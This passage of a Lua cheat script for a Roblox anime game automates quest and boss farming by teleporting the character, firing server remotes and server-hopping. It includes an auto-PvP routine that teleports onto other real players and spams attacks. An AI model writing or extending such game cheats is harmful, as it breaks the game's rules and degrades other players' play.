    local QuestUI = PGui:WaitForChild('QuestUI')
    local QuestFrame = QuestUI:WaitForChild('Quest'):WaitForChild('Quest')
    local QuestInfo = QuestFrame:WaitForChild('Holder'):WaitForChild('Content'):WaitForChild('QuestInfo')
    local QuestTitle = QuestInfo:WaitForChild('QuestTitle'):WaitForChild('QuestTitle')
    local QuestDesc = QuestInfo:WaitForChild('QuestDescription')
    local lastBossHP = math.huge

    function GetTitle()
        return QuestTitle and QuestTitle.Text or ''
    end
    function GetDesc()
        return QuestDesc and QuestDesc.Text or ''
    end
    function IsVisible()
        return QuestFrame and QuestFrame.Visible
    end
    function IsDone()
        local c, m = GetQuestProgressUI()

        c = tonumber(c) or 0
        m = tonumber(m) or 0

        return m > 0 and c >= m
    end

    Remotes.QuestAbandon:FireServer()
    task.wait(0.5)
    Remotes.QuestAccept:FireServer('SukunaMovesetNPC')
    task.wait(1.5)
    UI:Notify({
        Title = 'Sukuna Quest',
        Description = 'Quest started!',
        Duration = 3,
    })

    while Toggles.AutoSukunaQuest and Toggles.AutoSukunaQuest.Value do
        task.wait(0.05)

        if not IsVisible() then
            Remotes.QuestAbandon:FireServer()
            task.wait(0.5)
            Remotes.QuestAccept:FireServer('SukunaMovesetNPC')
            task.wait(1.5)

            continue
        end

        local titleLow = GetTitle():lower()
        local descLow = GetDesc():lower()
        local cur, max = GetQuestProgressUI()

        cur = tonumber(cur) or 0
        max = tonumber(max) or 0

        if titleLow:find('training 1') or descLow:find('damage') then
            if IsDone() then
                UI:Notify({
                    Title = 'Sukuna Quest',
                    Description = 'Stage 1 done!',
                    Duration = 3,
                })
                task.wait(1)

                continue
            end

            local target = GetBestMobCluster({ThiefBoss = true}) or GetBestMobCluster({MonkeyBoss = true}) or GetNearestMobTarget()

            if not target then
                WaitAtSpawn()

                continue
            end

            local isBoss = target.Name:find('Boss') and not table.find(Tables.MiniBossList, target.Name)

            AttackTarget(target, GetNearestIsland(target:GetPivot().Position), isBoss and 'Boss' or 'Mob')
        elseif titleLow:find('training 2') or descLow:find('player') then
            if IsDone() then
                UI:Notify({
                    Title = 'Sukuna Quest',
                    Description = 'Stage 2 done!',
                    Duration = 3,
                })
                task.wait(1)

                continue
            end

            local char = GetCharacter()
            local root = char and char:FindFirstChild('HumanoidRootPart')
            local closestPlayer, closestDist = nil, math.huge

            if root then
                for _, p in pairs(Players:GetPlayers())do
                    if p ~= Plr and p.Character then
                        local pRoot = p.Character:FindFirstChild('HumanoidRootPart')
                        local pHum = p.Character:FindFirstChildOfClass('Humanoid')
                        local pvpEnabled = p:GetAttribute('DisablePvP') == false or p:GetAttribute('PvP') == true or p:GetAttribute('DisablePvP') == nil

                        if pRoot and pHum and pHum.Health > 0 and pvpEnabled then
                            local d = (root.Position - pRoot.Position).Magnitude

                            if d < closestDist then
                                closestDist = d
                                closestPlayer = p
                            end
                        end
                    end
                end
            end
            if closestPlayer and closestPlayer.Character then
                local pRoot = closestPlayer.Character:FindFirstChild('HumanoidRootPart')
                local pHum = closestPlayer.Character:FindFirstChildOfClass('Humanoid')

                if pRoot and pHum and root then
                    EquipWeapon()

                    root.CFrame = pRoot.CFrame * CFrame.new(0, 0, 3)
                    root.AssemblyLinearVelocity = Vector3.zero

                    local killed, conn = false, nil

                    conn = pHum.Died:Connect(function()
                        killed = true

                        conn:Disconnect()
                    end)

                    local timeout = tick()

                    while not killed and tick() - timeout < 15 and Toggles.AutoSukunaQuest and Toggles.AutoSukunaQuest.Value do
                        if pHum.Health > 0 then
                            root.CFrame = pRoot.CFrame * CFrame.new(0, 0, 3)
                            root.AssemblyLinearVelocity = Vector3.zero

                            for i = 1, 3 do
                                pcall(function()
                                    Remotes.M1:FireServer()
                                end)
                                task.wait(0.05)
                            end
                        end

                        task.wait(0.1)
                    end

                    if not killed and conn then
                        conn:Disconnect()
                    end
                end
            else
                UI:Notify({
                    Title = 'Sukuna Quest',
                    Description = 'No PvP players nearby. (' .. cur .. '/25)\nWaiting...',
                    Duration = 3,
                })
                task.wait(3)
            end
        elseif titleLow:find('training 3') or descLow:find('sukuna') or descLow:find('boss') then
            if IsDone() then
                UI:Notify({
                    Title = 'Sukuna Quest',
                    Description = 'All stages done! Buy Sukuna style.',
                    Duration = 8,
                })
                RestoreState()

                if Toggles.AutoSukunaQuest then
                    Toggles.AutoSukunaQuest.Value = false
                end

                break
            end

            local boss = GetBestMobCluster({SukunaBoss = true})

            if boss then
                local hum = boss:FindFirstChildOfClass('Humanoid')
                local curHP = hum and hum.Health or 0

                if curHP <= 0 and lastBossHP > 0 then
                    UI:Notify({
                        Title = 'Sukuna Quest',
                        Description = 'Boss killed! ' .. cur .. '/' .. max,
                        Duration = 3,
                    })

                    lastBossHP = math.huge

                    task.wait(2)

                    continue
                end

                lastBossHP = curHP

                AttackTarget(boss, 'Shibuya', 'Boss')
            else
                lastBossHP = math.huge

                UI:Notify({
                    Title = 'Sukuna Quest',
                    Description = 'Waiting for SukunaBoss... (' .. cur .. '/' .. max .. ')',
                    Duration = 4,
                })
                WaitAtSpawn()
            end
        else
            UI:Notify({
                Title = 'Sukuna Quest',
                Description = 'Unknown stage: ' .. GetTitle() .. '\n' .. GetDesc(),
                Duration = 4,
            })
            task.wait(2)
        end
    end

    RestoreState()
end
function Func_AutoGojoGetItems()
    RunItemFarmAndDisable('AutoGojoGetItems', {
        bossName = 'GojoBoss',
        island = 'Shibuya',
        diff = 'Normal',
        notifyTitle = 'Gojo Items',
        toggleKey = 'AutoGojoGetItems',
        requirements = {
            {
                name = 'Void Fragment',
                need = 6,
            },
            {
                name = 'Limitless Ring',
                need = 3,
            },
            {
                name = 'Infinity Core',
                need = 1,
            },
        },
    })
end
function Func_AutoSukunaGetItems()
    RunItemFarmAndDisable('AutoSukunaGetItems', {
        bossName = 'SukunaBoss',
        island = 'Shibuya',
        diff = 'Normal',
        notifyTitle = 'Sukuna Items',
        toggleKey = 'AutoSukunaGetItems',
        requirements = {
            {
                name = 'Cursed Finger',
                need = 6,
            },
            {
                name = 'Dismantle Fang',
                need = 3,
            },
            {
                name = 'Crimson Heart',
                need = 1,
            },
        },
    })
end
function Func_AutoYujiGetItems()
    RunItemFarmAndDisable('AutoYujiGetItems', {
        bossName = 'YujiBoss',
        island = 'Boss',
        diff = 'Normal',
        notifyTitle = 'Yuji Items',
        toggleKey = 'AutoYujiGetItems',
        requirements = {
            {
                name = 'Energy Core',
                need = 7,
            },
            {
                name = 'Flash Impact',
                need = 3,
            },
            {
                name = 'Divergent Pulse',
                need = 1,
            },
        },
    })
end
function Func_AutoQinShiFull()
    local ok = AutoFarmForItems({
        bossName = 'QinShiBoss',
        island = 'Boss',
        diff = 'Normal',
        notifyTitle = 'Qin Shi',
        toggleKey = 'AutoQinShiFull',
        requirements = {
            {
                name = 'Jade Tablet',
                need = 7,
            },
            {
                name = 'Imperial Seal',
                need = 3,
            },
        },
    })

    if not ok or not (Toggles.AutoQinShiFull and Toggles.AutoQinShiFull.Value) then
        return
    end

    Notify('Qin Shi', 'Exchanging for style...')

    local r, err = pcall(function()
        RS.Remotes.ExchangeItem:InvokeServer('Qin Shi')
    end)

    Notify('Qin Shi', r and 'Done! Style unlocked.' or 'Exchange failed: ' .. tostring(err))

    if Toggles.AutoQinShiFull then
        Toggles.AutoQinShiFull.Value = false
    end
end
function Func_AutoGilgameshFull()
    local diff = Options.SelectedGilgameshDiff or 'Normal'
    local ok = AutoFarmForItems({
        bossName = 'GilgameshBoss',
        island = 'Boss',
        diff = diff,
        notifyTitle = 'Gilgamesh',
        toggleKey = 'AutoGilgameshFull',
        requirements = {
            {
                name = 'Throne Remnant',
                need = 12,
            },
            {
                name = 'Ancient Shard',
                need = 6,
            },
            {
                name = 'Golden Essence',
                need = 3,
            },
            {
                name = 'Phantasm Core',
                need = 1,
            },
            {
                name = 'Golden King',
                need = 1,
            },
        },
        buyNpcName = 'GilgameshBuyerNPC',
        buyRemoteKey = 'GilgameshStyle',
    })

    if Toggles.AutoGilgameshFull then
        Toggles.AutoGilgameshFull.Value = false
    end
end
function Func_AutoBlessedMaidenFull()
    local diff = Options.SelectedBlessedMaidenDiff or 'Normal'
    local ok = AutoFarmForItems({
        bossName = 'BlessedMaidenBoss',
        island = 'Boss',
        diff = diff,
        notifyTitle = 'Blessed Maiden',
        toggleKey = 'AutoBlessedMaidenFull',
        requirements = {
            {
                name = 'Celestial Mark',
                need = 1,
            },
            {
                name = 'Aero Core',
                need = 3,
            },
            {
                name = 'Gale Essence',
                need = 8,
            },
            {
                name = 'Tide Remnant',
                need = 14,
            },
            {
                name = 'Tempest Relic',
                need = 25,
            },
            {
                name = 'Astral Empress',
                need = 1,
            },
        },
        buyNpcName = 'BlessedMaidenBuyerNPC',
        buyRemoteKey = 'BlessedMaidenStyle',
    })

    if Toggles.AutoBlessedMaidenFull then
        Toggles.AutoBlessedMaidenFull.Value = false
    end
end
function Func_AutoSaberAlterFull()
    local diff = Options.SelectedSaberAlterDiff or 'Normal'
    local ok = AutoFarmForItems({
        bossName = 'SaberAlterBoss',
        island = 'Boss',
        diff = diff,
        notifyTitle = 'Saber Alter',
        toggleKey = 'AutoSaberAlterFull',
        requirements = {
            {
                name = 'Dark Grail',
                need = 25,
            },
            {
                name = 'Morgan Remnant',
                need = 15,
            },
            {
                name = 'Alter Essence',
                need = 8,
            },
            {
                name = 'Corruption Core',
                need = 3,
            },
            {
                name = 'Corrupt Crown',
                need = 1,
            },
            {
                name = 'Corrupt Tyrant',
                need = 1,
            },
        },
        buyNpcName = 'SaberAlterBuyerNPC',
        buyRemoteKey = 'SaberAlterStyle',
    })

    if Toggles.AutoSaberAlterFull then
        Toggles.AutoSaberAlterFull.Value = false
    end
end
function Func_AutoStrongestShinobiFull()
    local diff = Options.SelectedStrongestShiobiDiff or 'Normal'
    local ok = AutoFarmForItems({
        bossName = 'StrongestShinobiBoss',
        island = 'Ninja',
        diff = diff,
        notifyTitle = 'Strongest Shinobi',
        toggleKey = 'AutoStrongestShiobiFull',
        requirements = {
            {
                name = 'Battlefield Warlord',
                need = 1,
            },
            {
                name = 'Path Fragment',
                need = 1,
            },
            {
                name = 'Eternal Core',
                need = 3,
            },
            {
                name = 'Battle Sigil',
                need = 8,
            },
            {
                name = 'Power Remnant',
                need = 15,
            },
        },
        buyNpcName = 'StrongestShinobiBuyerNPC',
        buyRemoteKey = 'StrongestShinobiStyle',
    })

    if Toggles.AutoStrongestShiobiFull then
        Toggles.AutoStrongestShiobiFull.Value = false
    end
end
function Func_AutoMoonSlayerFull()
    local diff = Options.SelectedMoonSlayerDiff or 'Normal'
    local island = Shared.BossTIMap['Moon Slayer'] or 'Boss'
    local bossMap = {
        Normal = 'MoonSlayerBoss_Normal',
        Medium = 'MoonSlayerBoss_Medium',
        Hard = 'MoonSlayerBoss_Hard',
        Extreme = 'MoonSlayerBoss_Extreme',
    }
    local ok = AutoFarmForItems({
        bossName = bossMap[diff] or 'MoonSlayerBoss_Normal',
        island = island,
        diff = diff,
        notifyTitle = 'Moon Slayer',
        toggleKey = 'AutoMoonSlayerFull',
        requirements = {
            {
                name = 'Six Eyed Demon',
                need = 1,
            },
            {
                name = 'Moon Crest',
                need = 1,
            },
            {
                name = 'Crescent Shard',
                need = 4,
            },
            {
                name = 'Lunar Essence',
                need = 9,
            },
            {
                name = 'Demon Remnant',
                need = 16,
            },
            {
                name = 'Upper Seal',
                need = 25,
            },
        },
        buyNpcName = 'MoonSlayerBuyerNPC',
        buyRemoteKey = 'MoonSlayerStyle',
    })

    if Toggles.AutoMoonSlayerFull then
        Toggles.AutoMoonSlayerFull.Value = false
    end
end
function Func_AutoAnosFull()
    local diff = Options.SelectedAnosDiff or 'Normal'
    local bossMap = {
        Normal = 'AnosBoss_Normal',
        Medium = 'AnosBoss_Medium',
        Hard = 'AnosBoss_Hard',
        Extreme = 'AnosBoss_Extreme',
    }
    local ok = AutoFarmForItems({
        bossName = bossMap[diff] or 'AnosBoss_Normal',
        island = 'Academy',
        diff = diff,
        notifyTitle = 'Anos',
        toggleKey = 'AutoAnosFull',
        requirements = {
            {
                name = 'Calamity Seal',
                need = 65,
            },
            {
                name = 'Demonic Fragment',
                need = 12,
            },
            {
                name = 'Demonic Shard',
                need = 6,
            },
            {
                name = 'Destruction Eye',
                need = 2,
            },
            {
                name = 'Imperial Mark',
                need = 1,
            },
            {
                name = 'Voldigoat',
                need = 1,
            },
            {
                name = 'Demon King',
                need = 1,
            },
        },
        buyNpcName = 'AnosBuyerNPC',
        buyRemoteKey = 'AnosStyle',
    })

    if Toggles.AutoAnosFull then
        Toggles.AutoAnosFull.Value = false
    end
end
function Func_AutoGojoV2Full()
    local diff = Options.SelectedGojoV2Diff or 'Normal'
    local bossMap = {
        Normal = 'StrongestofTodayBoss_Normal',
        Medium = 'StrongestofTodayBoss_Medium',
        Hard = 'StrongestofTodayBoss_Hard',
        Extreme = 'StrongestofTodayBoss_Extreme',
    }
    local ok = AutoFarmForItems({
        bossName = bossMap[diff] or 'StrongestofTodayBoss_Normal',
        island = 'Shinjuku',
        diff = diff,
        notifyTitle = 'Gojo V2',
        toggleKey = 'AutoGojoV2Full',
        requirements = {
            {
                name = 'Six Eye',
                need = 6,
            },
            {
                name = 'Reversal Pulse',
                need = 9,
            },
            {
                name = 'Blue Singularity',
                need = 3,
            },
            {
                name = 'Infinity Essence',
                need = 1,
            },
            {
                name = 'Strongest Sorcerer',
                need = 1,
            },
        },
    })

    if not ok or not (Toggles.AutoGojoV2Full and Toggles.AutoGojoV2Full.Value) then
        return
    end

    Notify('Gojo V2', 'Consuming 6x Six Eyes...')

    for i = 1, 6 do
        pcall(function()
            Remotes.UseItem:FireServer('Use', 'Six Eye', 1, false)
        end)
        task.wait(0.5)
    end

    TeleportToIsland('Shinjuku')
    SafeTeleportToNPC('StrongestofTodayBuyerNPC')
    task.wait(1)

    local bought = pcall(function()
        Remotes.MerchantBuy:InvokeServer('GojoV2Style', 1)
    end)

    Notify('Gojo V2', bought and 'Done! Gojo V2 unlocked!' or 'Almost done! Interact manually.')

    if Toggles.AutoGojoV2Full then
        Toggles.AutoGojoV2Full.Value = false
    end
end
function Func_AutoSukunaV2Full()
    local diff = Options.SelectedSukunaV2Diff or 'Normal'
    local bossMap = {
        Normal = 'StrongestinHistoryBoss_Normal',
        Medium = 'StrongestinHistoryBoss_Medium',
        Hard = 'StrongestinHistoryBoss_Hard',
        Extreme = 'StrongestinHistoryBoss_Extreme',
    }
    local ok = AutoFarmForItems({
        bossName = bossMap[diff] or 'StrongestinHistoryBoss_Normal',
        island = 'Boss',
        diff = diff,
        notifyTitle = 'Sukuna V2',
        toggleKey = 'AutoSukunaV2Full',
        requirements = {
            {
                name = 'Awakened Cursed Finger',
                need = 20,
            },
            {
                name = 'Vessel Ring',
                need = 7,
            },
            {
                name = 'Malevolent Soul',
                need = 3,
            },
            {
                name = 'Cursed Flesh',
                need = 1,
            },
            {
                name = 'Disgraced One',
                need = 1,
            },
        },
    })

    if not ok or not (Toggles.AutoSukunaV2Full and Toggles.AutoSukunaV2Full.Value) then
        return
    end

    Notify('Sukuna V2', 'Consuming 20x Awakened Cursed Fingers...')

    for i = 1, 20 do
        pcall(function()
            Remotes.UseItem:FireServer('Use', 'Awakened Cursed Finger', 1, false)
        end)
        task.wait(0.5)
    end

    TeleportToIsland('Shinjuku')
    SafeTeleportToNPC('StrongestinHistoryBuyerNPC')
    task.wait(1)

    local bought = pcall(function()
        Remotes.MerchantBuy:InvokeServer('SukunaV2Style', 1)
    end)

    Notify('Sukuna V2', bought and 'Done! Sukuna V2 unlocked!' or 'Almost done! Interact manually.')

    if Toggles.AutoSukunaV2Full then
        Toggles.AutoSukunaV2Full.Value = false
    end
end
function Func_AutoAlucardFull()
    local money, gems = Plr.Data.Money.Value, Plr.Data.Gems.Value

    if money < 6500000 then
        Notify('Alucard', 'Need 6,500,000 money!')

        if Toggles.AutoAlucardFull then
            Toggles.AutoAlucardFull.Value = false
        end

        return
    end
    if gems < 10000 then
        Notify('Alucard', 'Need 10,000 gems!')

        if Toggles.AutoAlucardFull then
            Toggles.AutoAlucardFull.Value = false
        end

        return
    end

    local race = Plr:GetAttribute('CurrentRace') or ''

    if race:lower() ~= 'vampire' then
        Notify('Alucard', 'Vampire Race required!')

        if Toggles.AutoAlucardFull then
            Toggles.AutoAlucardFull.Value = false
        end

        return
    end

    local function hasTitle()
        for _, id in ipairs(Tables.UnlockedTitle)do
            local s = tostring(id):lower():gsub('%s+', '')

            if s:find('vampireking') then
                return true
            end
        end

        return false
    end

    while Toggles.AutoAlucardFull and Toggles.AutoAlucardFull.Value do
        local reqs = {
            {
                name = 'Soul Amulet',
                need = 5,
            },
            {
                name = 'Casull',
                need = 1,
            },
            {
                name = 'Blood Ring',
                need = 1,
            },
        }
        local itemsDone = HasAllItems(reqs) and hasTitle()

        if itemsDone then
            break
        end
        if not HasAllItems(reqs) then
            AutoFarmForItems({
                bossName = 'AlucardBoss',
                island = 'Sailor',
                diff = 'Normal',
                notifyTitle = 'Alucard',
                toggleKey = 'AutoAlucardFull',
                requirements = reqs,
            })
        end

        task.wait(0.1)
    end

    if not (Toggles.AutoAlucardFull and Toggles.AutoAlucardFull.Value) then
        return
    end

    Notify('Alucard', 'All done! Purchasing style...')
    TeleportToIsland('Sailor')
    SafeTeleportToNPC('AlucardBuyer')
    task.wait(1)

    local ok = pcall(function()
        Remotes.MerchantBuy:InvokeServer('AlucardStyle', 1)
    end)

    Notify('Alucard', ok and 'Done! Alucard style unlocked!' or 'Interact manually.')

    if Toggles.AutoAlucardFull then
        Toggles.AutoAlucardFull.Value = false
    end
end

local CosmicBossKeywords = {
    'CosmicBeingBoss_Normal',
}
local CosmicBossIsland = 'Punch'

function MoveAbove(target, yOffset)
    if not target or not target.Parent then
        return false
    end

    local char = GetCharacter()
    local root = char and char:FindFirstChild('HumanoidRootPart')

    if not root then
        return false
    end

    local targetPos = nil

    pcall(function()
        targetPos = target:GetPivot().Position
    end)

    if not targetPos then
        return false
    end

    local finalPos = targetPos + Vector3.new(0, yOffset or 150, 0)
    local movementType = Options.SelectedMovementType or 'Tween'

    if movementType == 'Teleport' then
        root.CFrame = CFrame.new(finalPos)
    else
        local dist = (root.Position - finalPos).Magnitude

        if dist > 3 then
            local speed = Options.TweenSpeed or 160
            local duration = math.clamp(dist / speed, 0.05, 0.4)
            local tw = TweenService:Create(root, TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                CFrame = CFrame.new(finalPos),
            })

            tw:Play()
            tw.Completed:Wait()
        end
    end

    root.AssemblyLinearVelocity = Vector3.zero
    root.AssemblyAngularVelocity = Vector3.zero

    return true
end
function FindLiveSeaBoss()
    return FindLiveByKeywords({
        'kraken',
        'seaserpent',
        'seabeast',
    }, true, true, true)
end
function Func_AutoCosmicBoss()
    while Toggles.AutoCosmicBoss and Toggles.AutoCosmicBoss.Value do
        task.wait(0.05)

        local boss = FindLiveBossAnywhere(CosmicBossKeywords)

        if not boss then
            Shared.CosmicBossFound = false

            task.wait(0.5)

            continue
        end

        Shared.CosmicBossFound = true
        Shared.Target = boss
        Shared.TargetValid = true

        if not MoveAbove(boss, 150) then
            task.wait(0.3)

            continue
        end

        EquipWeapon()

        if not IsAlive(boss) then
            Shared.CosmicBossFound = false

            continue
        end

        TryInstaKill(boss)
        BurstM1OnTarget(boss, 5, 0.04)
        FireSkillsWithPositionLock()
        UpdateSwitchState(boss, 'Boss')
    end

    Shared.CosmicBossFound = false
end

local SEA_WAIT_CENTER = Vector3.new(-3617.011474609375, -8.301654815673828, -2396.183837890625)
local SEA_ORBIT_RADIUS = 15
local SEA_ORBIT_SPEED = 3

function Func_AutoSeaBossSpawn()
    while Toggles.AutoSeaBossSpawn and Toggles.AutoSeaBossSpawn.Value do
        if Toggles.AutoCosmicBoss and Toggles.AutoCosmicBoss.Value then
            local cosmic = FindLiveBossAnywhere(CosmicBossKeywords)

            if cosmic then
                Shared.SeaBossFound = false

                repeat
                    task.wait(1)

                    cosmic = FindLiveBossAnywhere(CosmicBossKeywords)
                until not cosmic or not (Toggles.AutoSeaBossSpawn and Toggles.AutoSeaBossSpawn.Value)

                task.wait(1)

                continue
            end
        end

        local bossRef = FindLiveSeaBoss()
        local bossAlive = bossRef ~= nil

        if bossAlive then
            Shared.SeaBossFound = true

            repeat
                task.wait(0.5)

                bossRef = FindLiveSeaBoss()
                bossAlive = bossRef ~= nil
            until not bossAlive or not (Toggles.AutoSeaBossSpawn and Toggles.AutoSeaBossSpawn.Value)

            Shared.SeaBossFound = false

            task.wait(3)

            continue
        end

        Shared.SeaBossFound = false

        local char = GetCharacter()
        local root = char and char:FindFirstChild('HumanoidRootPart')

        if not root then
            task.wait(1)

            continue
        end

        local startPos = SEA_WAIT_CENTER + Vector3.new(SEA_ORBIT_RADIUS, 0, 0)
        local dist = (root.Position - startPos).Magnitude

        if dist > 20 then
            local duration = math.clamp(dist / 80, 0.5, 5)
            local tw = TweenService:Create(root, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
                CFrame = CFrame.new(startPos, SEA_WAIT_CENTER),
            })

            tw:Play()
            tw.Completed:Wait()
        end

        local angle = 0

        while Toggles.AutoSeaBossSpawn and Toggles.AutoSeaBossSpawn.Value do
            if Toggles.AutoCosmicBoss and Toggles.AutoCosmicBoss.Value then
                if FindLiveBossAnywhere(CosmicBossKeywords) then
                    break
                end
            end

            local alive = FindLiveSeaBoss() ~= nil

            if alive then
                Shared.SeaBossFound = true

                break
            end

            angle = (angle + (math.pi * 2 / SEA_ORBIT_SPEED) * 0.1) % (math.pi * 2)

            local orbitPos = Vector3.new(SEA_WAIT_CENTER.X + math.cos(angle) * SEA_ORBIT_RADIUS, SEA_WAIT_CENTER.Y, SEA_WAIT_CENTER.Z + math.sin(angle) * SEA_ORBIT_RADIUS)
            local c = GetCharacter()
            local r = c and c:FindFirstChild('HumanoidRootPart')

            if r then
                local tw = TweenService:Create(r, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {
                    CFrame = CFrame.new(orbitPos, SEA_WAIT_CENTER),
                })

                tw:Play()
            end

            task.wait(0.1)
        end
    end

    Shared.SeaBossFound = false
end

local SEA_BOSS_Y_OFFSET = 150
local SEA_DODGE_ACTIVE = false

function GetSeaBossPosition(boss)
    local pos = nil

    pcall(function()
        pos = boss:GetPivot().Position
    end)

    if not pos then
        local root = boss:FindFirstChild('RootPart') or boss.PrimaryPart or boss:FindFirstChild('kraken_low') or boss:FindFirstChildOfClass('BasePart')

        if root then
            pos = root.Position
        end
    end

    return pos
end
function Func_AutoSeaBoss()
    while Toggles.AutoSeaBoss and Toggles.AutoSeaBoss.Value do
        task.wait(0.05)

        local boss = FindLiveSeaBoss()

        if not boss then
            Shared.SeaBossFound = false

            task.wait(0.5)

            continue
        end

        Shared.SeaBossFound = true
        Shared.Target = boss
        Shared.TargetValid = true

        if not MoveAbove(boss, Options.SeaBossYOffset or SEA_BOSS_Y_OFFSET) then
            task.wait(0.3)

            continue
        end

        EquipWeapon()

        if not IsAlive(boss) then
            Shared.SeaBossFound = false

            continue
        end

        TryInstaKill(boss)
        BurstM1OnTarget(boss, 5, 0.04)
        FireSkillsWithPositionLock()
    end

    Shared.SeaBossFound = false
end
function Func_AutoSeaDodge()
    local function IsAttacking()
        local SoundService = game:GetService('SoundService')

        for _, child in pairs(SoundService:GetChildren())do
            local n = child.Name:lower()

            if n:find('soundpart_seaserpentattack1') or n:find('soundpart_seaserpentattack2') or n:find('soundpart_seaserpentattack3') then
                return true
            end
        end

        local attackPatterns = {
            'KkrakenAttack1',
            'KkrakenAttack2',
            'KkrakenAttack3',
            'KrakenAttack',
        }

        for _, pattern in ipairs(attackPatterns)do
            if workspace:FindFirstChild(pattern) then
                return true
            end
        end

        return false
    end
    local function GetSafeDodgePos(boss)
        local bossPos = GetSeaBossPosition(boss)

        if not bossPos then
            return nil
        end

        local yOffset = (Options.SeaBossYOffset or SEA_BOSS_Y_OFFSET) + (Options.SeaDodgeDistance or 80)

        return CFrame.new(bossPos + Vector3.new(0, yOffset, 0))
    end
    local function GetNormalPos(boss)
        local bossPos = GetSeaBossPosition(boss)

        if not bossPos then
            return nil
        end

        local yOffset = Options.SeaBossYOffset or SEA_BOSS_Y_OFFSET

        return CFrame.new(bossPos + Vector3.new(0, yOffset, 0))
    end

    while Toggles.AutoSeaDodge and Toggles.AutoSeaDodge.Value do
        task.wait(0.05)

        if not (Toggles.AutoSeaBoss and Toggles.AutoSeaBoss.Value) then
            SEA_DODGE_ACTIVE = false

            task.wait(0.5)

            continue
        end

        local char = GetCharacter()
        local root = char and char:FindFirstChild('HumanoidRootPart')

        if not root then
            task.wait(0.5)

            continue
        end

        local attacking = IsAttacking()

        if attacking and not SEA_DODGE_ACTIVE then
            SEA_DODGE_ACTIVE = true

            local boss = FindLiveSeaBoss()

            if not boss then
                SEA_DODGE_ACTIVE = false

                continue
            end

            local dodgeCF = GetSafeDodgePos(boss)

            if dodgeCF then
                root.CFrame = dodgeCF
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
            end

            local timeout = tick()

            repeat
                task.wait(0.1)
            until not IsAttacking() or tick() - timeout > 5 or not (Toggles.AutoSeaDodge and Toggles.AutoSeaDodge.Value)

            task.wait(0.1)

            local c2 = GetCharacter()
            local r2 = c2 and c2:FindFirstChild('HumanoidRootPart')

            if r2 then
                boss = FindLiveSeaBoss()

                if boss then
                    local returnCF = GetNormalPos(boss)

                    if returnCF then
                        r2.CFrame = returnCF
                        r2.AssemblyLinearVelocity = Vector3.zero
                    end
                end
            end

            task.wait(0.3)

            SEA_DODGE_ACTIVE = false
        elseif not attacking then
            SEA_DODGE_ACTIVE = false
        end
    end

    SEA_DODGE_ACTIVE = false
end
function Func_AutoHopUntilSeaBoss()
    local TARGET_PLACE_ID = 77747658251236
    local checkInterval = 3
    local elapsed = 0
    local hopAttempts = 0
    local MAX_HOP_ATTEMPTS = 10
    local boss = FindLiveSeaBoss()
    local alive = boss ~= nil

    if alive then
        UI:Notify({
            Title = 'Sea Boss Hop',
            Description = 'Already found in this server!',
            Duration = 3,
        })

        Toggles.AutoHopSeaBoss.Value = false

        if Toggles.AutoSeaBoss then
            Toggles.AutoSeaBoss.Value = true
        end

        return
    end

    UI:Notify({
        Title = 'Sea Boss Hop',
        Description = 'Searching servers...',
        Duration = 3,
    })

    while Toggles.AutoHopSeaBoss and Toggles.AutoHopSeaBoss.Value do
        task.wait(1)

        elapsed = elapsed + 1

        local isAlive = FindLiveSeaBoss() ~= nil

        if isAlive then
            UI:Notify({
                Title = 'Sea Boss Found!',
                Description = 'Sea Boss is alive! Starting farm...',
                Duration = 4,
            })

            Toggles.AutoHopSeaBoss.Value = false

            if Toggles.AutoSeaBossSpawn then
                Toggles.AutoSeaBossSpawn.Value = false
            end
            if Toggles.AutoSeaBoss then
                Toggles.AutoSeaBoss.Value = true

                Thread('SeaBoss.AutoKill', SafeLoop('Auto Sea Boss', Func_AutoSeaBoss), true)
            end

            break
        end
        if elapsed >= checkInterval then
            elapsed = 0
            hopAttempts = hopAttempts + 1

            if hopAttempts > MAX_HOP_ATTEMPTS then
                UI:Notify({
                    Title = 'Sea Hop',
                    Description = 'Max hops reached. Stopping.',
                    Duration = 5,
                })

                Toggles.AutoHopSeaBoss.Value = false

                break
            end

            UI:Notify({
                Title = 'Sea Hop',
                Description = 'Hop #' .. hopAttempts .. ' - Searching...',
                Duration = 2,
            })

            local hopped = false
            local retries = 0

            while not hopped and retries < 3 do
                retries = retries + 1

                pcall(function()
                    local Http = game:GetService('HttpService')
                    local TS = game:GetService('TeleportService')
                    local JobID = game.JobId
                    local candidates = {}
                    local nextCursor = nil

                    repeat
                        local url = 'https://games.roblox.com/v1/games/' .. TARGET_PLACE_ID .. '/servers/Public?sortOrder=Asc&limit=100'

                        if nextCursor and nextCursor ~= '' then
                            url = url .. '&cursor=' .. nextCursor
                        end

                        local ok, res = pcall(function()
                            return Http:JSONDecode(game:HttpGet(url))
                        end)

                        if not ok or not res or not res.data then
                            break
                        end

                        for _, server in pairs(res.data)do
                            if server.id ~= JobID and server.playing < server.maxPlayers and server.playing > 0 then
                                table.insert(candidates, server)
                            end
                        end

                        nextCursor = res.nextPageCursor
                    until not nextCursor or #candidates >= 20

                    if #candidates > 0 then
                        local pick = candidates[math.random(1, math.min(10, #candidates))]

                        TS:TeleportToPlaceInstance(TARGET_PLACE_ID, pick.id, Plr)

                        hopped = true
                    else
                        TS:Teleport(TARGET_PLACE_ID, Plr)

                        hopped = true
                    end
                end)

                if not hopped then
                    task.wait(2)
                end
            end

            if hopped then
                task.wait(10)
            end
        end
    end
end
function Func_AutoHopUntilCosmicBoss()
    local TARGET_PLACE_ID = 77747658251236
    local checkInterval = 3
    local elapsed = 0
    local hopAttempts = 0
    local MAX_HOP_ATTEMPTS = 15

    local function IsCosmicAliveNow()
        return FindLiveBossAnywhere(CosmicBossKeywords) ~= nil
    end

    if IsCosmicAliveNow() then
        UI:Notify({
            Title = 'Cosmic Hop',
            Description = 'Cosmic Boss already here!',
            Duration = 3,
        })

        Toggles.AutoHopCosmicBoss.Value = false

        if Toggles.AutoCosmicBoss then
            Toggles.AutoCosmicBoss.Value = true

            Thread('CosmicBoss.AutoKill', SafeLoop('Auto Cosmic Boss', Func_AutoCosmicBoss), true)
        end

        return
    end

    UI:Notify({
        Title = 'Cosmic Hop',
        Description = 'Searching servers for Cosmic Boss...',
        Duration = 3,
    })

    while Toggles.AutoHopCosmicBoss and Toggles.AutoHopCosmicBoss.Value do
        task.wait(1)

        elapsed = elapsed + 1

        if IsCosmicAliveNow() then
            UI:Notify({
